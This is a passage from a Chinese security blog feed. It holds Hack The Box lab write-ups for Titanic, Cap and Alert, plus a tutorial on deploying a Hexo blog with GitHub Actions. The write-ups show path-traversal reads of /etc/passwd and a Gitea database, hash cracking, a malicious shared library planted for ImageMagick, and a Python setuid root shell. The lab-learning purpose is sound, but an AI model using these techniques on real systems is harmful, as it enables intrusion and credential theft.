src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250413173913-xclppav.png" alt="image"></p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>htb</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_Titanic</title>
    <link href="/post/titanic-rr83r.html"/>
    <url>/post/titanic-rr83r.html</url>
    
    <content type="html"><![CDATA[<h1 id="htb-Titanic"><a href="#htb-Titanic" class="headerlink" title="htb_Titanic"></a>htb_Titanic</h1><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250408153537-0o4fjhq.png" alt="image"></p><h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>首先还是将这个添加到&#x2F;etc&#x2F;hosts</p><p>​<code>echo &quot;10.10.11.55 titanic.htb&quot; |sudo tee -a /etc/hosts</code>​</p><p>访问</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250408154415-dgzrq5h.png" alt="image"></p><p>在最下方填写点东西bp抓包看一下</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250408155323-01vk75u.png" alt="image"></p><p>访问download路由可以下载，里面包含刚刚输入的东西</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250408155559-2yf0zwf.png" alt="image"></p><p>那么也就是说这个逻辑是将刚刚输入的东西存到1cab2a16-9e10-4209-9693-2b0465c6151c.json文件中，再通过download路由进行下载</p><p>so可以尝试一下路径遍历</p><p>​<code>?ticket=../../../../../../etc/passwd</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250408155955-xy4o247.png" alt="image"></p><p>可以看到也是成功了</p><p>那么可以尝试读取一下user.txt</p><p>需要知道具体路径</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250408160526-9677uys.png" alt="image"></p><p>拿到了<code>/home/developer</code>​</p><p>路径遍历一下</p><p>​<code>http://titanic.htb/download?ticket=../../../../../../../home/developer/user.txt</code>​</p><p>第一层flag拿到</p><h1 id="Gitea"><a href="#Gitea" class="headerlink" title="Gitea"></a>Gitea</h1><p>接下来想办法ssh连接，毕竟开放了22端口</p><p>那么一定有一个密码需要我们找</p><p>先来爆破一下子域名</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250408161350-5enadk5.png" alt="image"></p><p>也是很轻松的就爆出来了，将 <strong>dev.titanic.htb</strong> 添加到  <strong>&#x2F;etc&#x2F;hosts</strong></p><p>访问一下<code>http://dev.titanic.htb/</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250408163623-yoxjp1h.png" alt="image"></p><p>之后就是查看gitea的官方文档，<strong>gitea</strong> 的数据库文件一般在  <strong>&#x2F;data&#x2F;gitea.db</strong> 中</p><p>而Gitea 在 Docker 容器中运行将数据存储在<code>/data/gitea </code>​docker 镜像中</p><p>所以最终路径应该为</p><p>​<code>/home/developer/gitea/data/gitea/gitea.db</code>​</p><p>尝试使用下面的路径进行下载</p><p>​<code>http://titanic.htb/download?ticket=../../../../../../../home/developer/gitea/data/gitea/gitea.db</code>​</p><p>查看user表</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250408192740-mjwel49.png" alt="image"></p><p>可以看到密码被加密了</p><p>需要手动转换或者使用<a href="https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py">gitea2hashcat.py</a>脚本进行格式化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bin">python3 gitea2hashcat.py 8bf3e3452b78544f8bee9400d6936d34:e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56<br></code></pre></td></tr></table></figure><p>然后将转换的结果用hashcat进行解密</p><p>​<code>hashcat -m 10900 titanic.hash /home/dream/桌面/rockyou.txt</code>​</p><p>最终得到了明文密码</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="疯狂试探"><a href="#疯狂试探" class="headerlink" title="疯狂试探"></a>疯狂试探</h2><p>ssh连接</p><p>​<code>ssh developer@titanic.htb</code>​</p><p>首先确定为普通用户权限，查看内核版本</p><p>​<code>uname -a</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250409141829-bmnr57a.png" alt="image"></p><p>权限不够，不能将exp上传</p><p>再查看有没有低权限的定时任务文件可以利用</p><p>​<code>cat /etc/crontab</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250409143458-3sol9eq.png" alt="image"></p><p>再看看SUID提权</p><p>​<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250409143831-iv01b6j.png" alt="image"></p><table><thead><tr><th>​<code>/usr/bin/sudo</code>​</th><th>如果 sudo 配置有漏洞，可能可以直接提权</th></tr></thead></table><table><thead><tr><th>​<code>/usr/bin/pkexec</code>​</th><th>很多老版本（如 polkit CVE-2021-4034）可以直接提权</th></tr></thead></table><p>所以先看一下<code>pkexec</code>​的版本</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250409144122-97r2rnd.png" alt="image"></p><p>OK，这个版本是有提权漏洞的，<del>下载一个网上的exp编译一下</del></p><p>忘记了，不能联网以及没有创建文件或文件夹的权限</p><p>那再看一下sudo</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250409144558-92u79fx.png" alt="image"></p><p>高版本，再看看配置会不会有问题</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250409144717-igt74fr.png" alt="image"></p><p>也没有什么可以利用的</p><p>想用docker提权但也是权限不足</p><h2 id="步入正轨"><a href="#步入正轨" class="headerlink" title="步入正轨"></a>步入正轨</h2><p>那就检查一下第三方软件会不会有什么漏洞</p><p>​<code>find /opt -type f</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250409145458-ufh2lus.png" alt="image"></p><p>看到了一个脚本文件，可以重点关注一下</p><p>​<code>cat /opt/scripts/identify_images.sh</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250409145619-ij3lzko.png" alt="image"></p><p>ImageMagick也是个很容易突破的口子，看一下对应版本</p><p>​<code>magick -version</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250409150223-07dmayw.png" alt="image"></p><p>查一下对应版本看是否有漏洞可以利用</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250409150400-9kcuqxy.png" alt="image"></p><p>找到了</p><p><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8</a></p><p>决定仿照这个写payload</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250409150631-tol2v03.png" alt="image"></p><p>根据 <strong>identify_image.sh</strong>，需要在  <strong>&#x2F;opt&#x2F;app&#x2F;static&#x2F;assets&#x2F;images</strong> 中生成 <strong>libxcb.so.1</strong> 才能导致 <strong>root</strong> 权限下的 <strong>magick</strong> 读取到 <strong>root.txt</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bin">cd /opt/app/static/assets/images<br> <br>gcc -x c -shared -fPIC -o ./libxcb.so.1 - &lt;&lt; EOF<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br> <br>__attribute__((constructor)) void init()&#123;<br>    system(&quot;cat /root/root.txt &gt; /tmp/rootflag&quot;);<br>    exit(0);<br>&#125;<br>EOF<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250409151718-g1xjk4v.png" alt="image"></p><p>OK，成功拿到</p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>htb</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_Cap</title>
    <link href="/post/cap-lewk0.html"/>
    <url>/post/cap-lewk0.html</url>
    
    <content type="html"><![CDATA[<h1 id="Cap"><a href="#Cap" class="headerlink" title="Cap"></a>Cap</h1><p>nmap扫一下，开放21ftp端口</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250322221621-kes7jtj.png" alt="image"></p><p>尝试匿名登录</p><p>登陆失败了，访问一下10.10.10.245</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325131601-mtir22m.png" alt="image"></p><p>点一下左面的Security Snopshot</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325131442-hynbx6a.png" alt="image"></p><p>尝试了很多数字，只有data&#x2F;0显示的内容有不同</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325131400-zqtdjo0.png" alt="image"></p><p>点击download下载pcap之后用wireshark分析</p><p>比较在意那个FTP里面会不会有登录的用户名密码</p><p>明文传输</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325135836-txbeyjs.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bin">用户名 nathan<br>密码 Buck3tH4TF0RM3!<br></code></pre></td></tr></table></figure><p>得到了用户名密码，ssh登录一下</p><p>​<code>ssh nathan@10.10.10.245</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325140012-2wakud4.png" alt="image"></p><p>先拿到了第一个普通用户的flag</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325140233-mdwcmt2.png" alt="image"> </p><p>下一步就是找到提权方式</p><p>​<code>find / -perm /6000 2&gt;/dev/null</code>​</p><p>看看有哪些文件可以进行读写</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325145807-ygvnm5r.png" alt="image"></p><p>于是可以通过<a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">linPEAS</a>来进行提权</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325154101-ssvwr1j.png" alt="image"></p><p>于是可以看一下怎么用python改变setuid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bin">import os<br>os.setuid(0)<br>os.system(&quot;/bin/bash&quot;)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325154941-84o18l5.png" alt="image"></p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>htb</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免费开源的一键化部署方案</title>
    <link href="/post/free-and-open-source-oneclick-deployment-solution-5yk6g.html"/>
    <url>/post/free-and-open-source-oneclick-deployment-solution-5yk6g.html</url>
    
    <content type="html"><![CDATA[<h1 id="免费开源的一键化部署方案"><a href="#免费开源的一键化部署方案" class="headerlink" title="免费开源的一键化部署方案"></a>免费开源的一键化部署方案</h1><p>本次部署采用思源+Hexo+GithubActions，本人亲测有效，完全免费，绝对可用</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>1.有一个GitHub账号</p><p>2.安装Git，hexo部署到GitHub时要用，我这里用的是wsl，wsl自带Git</p><p>3.安装NodeJS，hexo是基于NodeJS编写的，所以需要安装NodeJS和npm工具</p><p><a href="https://blog.csdn.net/yaorongke/article/details/119084295">https://blog.csdn.net/yaorongke/article/details/119084295</a>（Windows）</p><p><a href="https://blog.csdn.net/gandongusa/article/details/123010941">https://blog.csdn.net/gandongusa/article/details/123010941</a> （wsl）</p><h1 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h1><p>要创建三个仓库</p><table><thead><tr><th>存放图床</th><th><a href="https://github.com/Dre4m017/PicGo">https://github.com/Dre4m017/Pic</a></th></tr></thead><tbody><tr><td><strong>存放markdwn</strong></td><td><a href="https://github.com/Dre4m017/Blogs">https://github.com/Dre4m017/Blogs</a></td></tr><tr><td><strong>存放静态页面</strong></td><td><a href="https://github.com/Dre4m017/Dre4m017.github.io">https://github.com/Dre4m017/Dre4m017.github.io</a></td></tr></tbody></table><p><em>注意：存放markdown的仓库要设置成私有仓库提高安全性</em></p><h1 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h1><p>这里使用Hexo来搭建博客</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bin">npm install -g hexo-cli<br></code></pre></td></tr></table></figure><p>查看版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bin">hexo -v<br></code></pre></td></tr></table></figure><p>创建一个项目 <code>hexo-blog</code>​ 并初始化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bin">hexo init hexo-blog<br>cd hexo-blog<br>npm install<br></code></pre></td></tr></table></figure><p>本地启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bin">hexo g<br>hexo server<br></code></pre></td></tr></table></figure><p>浏览器访问 <a href="http://localhost:4000，页面默认主图风格如下">http://localhost:4000，页面默认主图风格如下</a></p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402180139.png" alt="image"></p><h1 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h1><p>官方提供了数百种主题供用户选择，可以根据个人喜好更换，官网主题点 <a href="https://hexo.io/themes/">这里</a> 查看，个人用的是<code>Fluid</code>​，后面章节的功能也是以 <code>Fluid</code>​ 为基础进行讲解的。</p><p><a href="https://github.com/fluid-dev/hexo-theme-fluid">fluid主题官方介绍</a></p><h2 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h2><p>下载 <a href="https://github.com/fluid-dev/hexo-theme-fluid/releases">最新 release 版本</a> 解压到 <code>themes</code>​ 目录，并将解压出的文件夹重命名为 <code>fluid</code>​。</p><h2 id="指定主题"><a href="#指定主题" class="headerlink" title="指定主题"></a>指定主题</h2><p>如下修改 <code>Hexo</code>​ 博客目录中的 <code>_config.yml</code>​：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bin">theme: fluid  # 指定主题<br>language: zh-CN  # 指定语言，会影响主题显示的语言，按需修改<br></code></pre></td></tr></table></figure><h2 id="创建「关于页」"><a href="#创建「关于页」" class="headerlink" title="创建「关于页」"></a><strong>创建「关于页」</strong></h2><p>首次使用主题的「关于页」需要手动创建：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bin">hexo new page about<br></code></pre></td></tr></table></figure><p>创建成功后，编辑博客目录下 <code>/source/about/index.md</code>​，添加 <code>layout</code>​ 属性。</p><p>修改后的文件示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bin">---<br>title: about<br>date: 2020-02-23 19:20:33<br>layout: about<br>---<br><br>这里写关于页的正文，支持 Markdown, HTML<br></code></pre></td></tr></table></figure><h2 id="本地启动"><a href="#本地启动" class="headerlink" title="本地启动"></a><strong>本地启动</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bin">hexo g -d<br>hexo s<br></code></pre></td></tr></table></figure><p>浏览器访问 <a href="http://localhost:4000/">http://localhost:4000</a></p><h1 id="个性化页面展示"><a href="#个性化页面展示" class="headerlink" title="个性化页面展示"></a>个性化页面展示</h1><p>页面的标题等位置显示默认的文字，可以改下显示一些个性化的信息。</p><h2 id="浏览器tab页名称"><a href="#浏览器tab页名称" class="headerlink" title="浏览器tab页名称"></a>浏览器tab页名称</h2><p>修改根目录下 <code>_config.yml</code>​ 中的 <code>title</code>​ 字段。</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402180244.png" alt="image"></p><h2 id="博客标题"><a href="#博客标题" class="headerlink" title="博客标题"></a>博客标题</h2><p>主题目录 <code>themes\fluid</code>​ 下 <code>_config.yml</code>​ 中的 <code>blog_title</code>​ 字段。</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402180307.png" alt="image"></p><h2 id="主页正中间的文字"><a href="#主页正中间的文字" class="headerlink" title="主页正中间的文字"></a>主页正中间的文字</h2><p>主题目录 <code>themes\fluid</code>​ 下 <code>_config.yml</code>​ 中的 <code>text</code>​ 字段。</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402180330.png" alt="image"></p><p>修改好配置后，页面效果如下，可以看到现在显示的内容变成了我们的个人信息。</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402180424.png" alt="image"></p><h1 id="添加阅读量统计"><a href="#添加阅读量统计" class="headerlink" title="添加阅读量统计"></a>添加阅读量统计</h1><p>需要借助三方服务来统计阅读量，这里是用 <code>Leancloud</code>​ 的免费服务来进行统计。</p><h2 id="申请LeanCloud账号"><a href="#申请LeanCloud账号" class="headerlink" title="申请LeanCloud账号"></a>申请LeanCloud账号</h2><p>进入 <a href="https://console.leancloud.cn/">官网</a> 注册账号</p><p>需实名认证，完成后才能使用各项服务</p><p>验证邮箱</p><p>创建应用，选择<code>开发版</code>​即可，免费的</p><p>进入该应用的 <code>设置-&gt;应用凭证</code>​，找到 <code>AppID</code>​ 和 <code>AppKey</code>​还有服务器地址，记录下来后面配置要用</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402180444.png" alt="image"></p><h2 id="修改Fluid配置"><a href="#修改Fluid配置" class="headerlink" title="修改Fluid配置"></a>修改Fluid配置</h2><p>打开主题目录 <code>themes\fluid</code>​下的 <code>_config.yml</code>​ 文件，修改如下配置</p><h3 id="单篇文章阅读量计数"><a href="#单篇文章阅读量计数" class="headerlink" title="单篇文章阅读量计数"></a>单篇文章阅读量计数</h3><p>打开统计开关</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402180504.png" alt="image"></p><p>配置 <code>leancloud</code>​的 <code>app_id</code>​ 和 <code>app_key</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402180526.png" alt="image"></p><h3 id="页面底部展示网站的-PV、UV-统计数"><a href="#页面底部展示网站的-PV、UV-统计数" class="headerlink" title="页面底部展示网站的 PV、UV 统计数"></a>页面底部展示网站的 PV、UV 统计数</h3><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402180542.png" alt="image"></p><h1 id="添加评论"><a href="#添加评论" class="headerlink" title="添加评论"></a>添加评论</h1><p>打开主题目录 <code>themes\fluid</code>​下的 <code>_config.yml</code>​ 文件，修改如下配置</p><p>启用评论插件</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402180643.png" alt="image"></p><p>配置 <code>LeanCloud</code>​ 的 <code>appId</code>​ 和 <code>appkey</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402180621.png" alt="image"></p><h1 id="思源配置"><a href="#思源配置" class="headerlink" title="思源配置"></a>思源配置</h1><p>本次需要使用的两个插件为</p><ul><li><a href="https://github.com/terwer/siyuan-plugin-publisher">siyuan-plugin-publisher</a></li><li><a href="https://github.com/terwer/siyuan-plugin-picgo">siyuan-plugin-picgo</a></li></ul><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402180733.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402180811.png" alt="image"></p><h2 id="PicGo"><a href="#PicGo" class="headerlink" title="PicGo"></a>PicGo</h2><p>配置PicGo</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402181041.png" alt="image"></p><p>参考这张图，完成个人的仓库名，分支</p><p><strong>经过测试完善，要把</strong>​<strong>替换本地链接****和</strong>​<strong>剪切板自动上传****给关掉，插件也可以关掉，避免在断网环境下本地笔记都打不开笔记图片</strong></p><p>以及Token设定</p><p>token生成如下：</p><p><a href="https://github.com/settings/tokens">Personal Access Tokens (Classic) (github.com)</a></p><p>token生成选择<strong>repo,admin:org,workflow,write:packages</strong></p><p> <em>(很重要，不然图片显示不出来</em></p><p>完成设置后，可以上传图片测试是否成功</p><h2 id="Publisher"><a href="#Publisher" class="headerlink" title="Publisher"></a>Publisher</h2><p>发布工具-&gt;设置-&gt;平台导入-&gt;一键全部导入-&gt;发布配置</p><p>启用Hexo，选择设置</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402181109.png" alt="image"></p><p>我这里markdown文档都是统一放到source&#x2F;_posts下面，所以发布目录选择&#x2F;source&#x2F;_posts,图床服务选择PicGo</p><p>其余基本默认即可，完成后及时完成测试</p><h1 id="Github-Actions"><a href="#Github-Actions" class="headerlink" title="Github Actions"></a>Github Actions</h1><p>这里将hexo-blog这个目录未编译的文件传到Blogs里面，可参考我的目录结构</p><p><a href="https://github.com/Dre4m017/Blogs">https://github.com/Dre4m017/Blogs</a></p><p> <em>（themes文件夹内容过多可能不能直接以拖拽的方式传到网页端github，可以先将项目clone到本地，在本地拖拽进对应的目录，再push上去，wsl可能会遇到网络问题push不上去，可以给wsl挂一个代理）</em></p><p>存放静态页面的项目什么都不用上传</p><h2 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bin">ssh-keygen -t ed25519 -f hexo_deploy_key_nopass -N &quot;&quot;<br></code></pre></td></tr></table></figure><p>在我们第一个存放源码的仓库<code>Blogs</code>​中将<code>hexo_deploy_key_nopass</code>​放入secret</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402181136.png" alt="image"></p><p>第二个.github.io的仓库Deploy存放hexo_deploy_key_nopass.pub</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402181208.png" alt="image"></p><p>完成上述之后，我们实际上为了完成两个仓库之间交互的第一步</p><h2 id="编写Action脚本"><a href="#编写Action脚本" class="headerlink" title="编写Action脚本"></a>编写Action脚本</h2><p>到Blogs下的Actions，New workflow→set up a workflow yourself ，自行编写Action脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bin">name: HEXO CI<br><br>on:<br>  push:<br>    branches:<br>    - main<br><br>jobs:<br>  build:<br>    runs-on: ubuntu-latest<br>    strategy:<br>      matrix:<br>        node-version: [20.x]<br><br>    steps:<br>      - uses: actions/checkout@v3<br><br>      - name: Use Node.js $&#123;&#123; matrix.node-version &#125;&#125;<br>        uses: actions/setup-node@v3<br>        with:<br>          node-version: $&#123;&#123; matrix.node-version &#125;&#125;<br><br>      - name: Configuration environment<br>        env:<br>          HEXO_EPLOY_PRI: $&#123;&#123; secrets.HEXO_EPLOY_PRI &#125;&#125; //改成你自己的Blogs secrets名称<br>        run: |<br>          mkdir -p ~/.ssh/<br>          echo &quot;$HEXO_EPLOY_PRI&quot; | tr -d &#x27;\r&#x27; &gt; ~/.ssh/id_rsa<br>          chmod 600 ~/.ssh/id_rsa<br>          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts<br>          git config --global user.name &quot;Dre4m017&quot;       //改成你自己的github名称<br>          git config --global user.email &quot;   &quot;           //写上你自己的邮箱<br><br>      - name: Install dependencies<br>        run: |<br>          npm install -g hexo-cli<br>          npm install<br>          npm install hexo-deployer-git --save<br><br>      - name: Deploy hexo<br>        run: |<br>          hexo clean<br>          hexo g<br>          hexo d<br></code></pre></td></tr></table></figure><h2 id="修改-config-yml"><a href="#修改-config-yml" class="headerlink" title="修改_config.yml"></a>修改_config.yml</h2><p>如果原來是 http 的，要改為 ssh 格式</p><ul><li><p>http</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402181227.png" alt="image"></p></li><li><p>ssh</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402181250.png" alt="image"></p></li></ul><p>到了这步应该就已经完成了笔记自动化部署了</p><p>之后就可以将思源的笔记一键发布了</p><p>可以在.github.io这个项目下的Settings-Pages找到自己的site</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/20250402181311.png" alt="image"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/yaorongke/article/details/119089190">https://blog.csdn.net/yaorongke/article/details/119089190</a></p><p><a href="https://wh1tej0ker.github.io/">https://wh1tej0ker.github.io/</a></p><p><del>友情客串</del></p><p><a href="https://n1mbus-lock.github.io/post/build-a-personal-blog-of-your-own-1qpsrd.html">https://n1mbus-lock.github.io/post/build-a-personal-blog-of-your-own-1qpsrd.html</a></p>]]></content>
    
    
    <categories>
      
      <category>其它</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客搭建</tag>
      
      <tag>Hexo</tag>
      
      <tag>思源</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_Alert</title>
    <link href="/post/alert-z1tfcsg.html"/>
    <url>/post/alert-z1tfcsg.html</url>
    
    <content type="html"><![CDATA[<h1 id="Alert"><a href="#Alert" class="headerlink" title="Alert"></a>Alert</h1><p>nmap扫一下，看到开放了22和80端口</p><p>访问一下</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325161928-ewoyelx.png" alt="image"></p><p>于是将该域添加到&#x2F;etc&#x2F;hosts</p><p>​<code>echo &quot;10.10.11.44 alert.htb&quot; |sudo tee -a /etc/hosts</code>​</p><p>进入了一个markdown网页</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325162450-l44l73b.png" alt="image"></p><p>用dirsearch扫出来<code>/messages.php</code>​是个空白页， 和<code>/uploads/</code>​访问返回403</p><p>再用ffuf进行子域名的爆破，找一个很全的字典，当然，kali也有自带的子域名字典<code>locate dns | grep &quot;/usr/share&quot; | grep &quot;.txt&quot;</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325170506-9z2mk45.png" alt="image"></p><p>我用的是下载的<a href="https://github.com/TheKingOfDuck/fuzzDicts">字典</a></p><p>​<code>ffuf -w /home/dream/桌面/fuzzDicts-master/subdomainDicts/dic1.txt -u http://alert.htb -H &quot;Host:FUZZ.alert.htb&quot; -fw 20</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325171537-35z6h0f.png" alt="image"></p><p>我们把这个子域名加到&#x2F;etc&#x2F;host</p><p>​<code>sudo sed -i &#39;/10.10.11.44 alert.htb/ s/$/ statistics.alert.htb/&#39; /etc/hosts</code>​</p><p>然后访问<code>statistics.alert.htb</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325172321-5xvhwoa.png" alt="image"></p><p>可以在网上搜索一下有关markdown的漏洞，最有可能的就是xss</p><p>那么就来试一下，创建一个markdown文档</p><figure 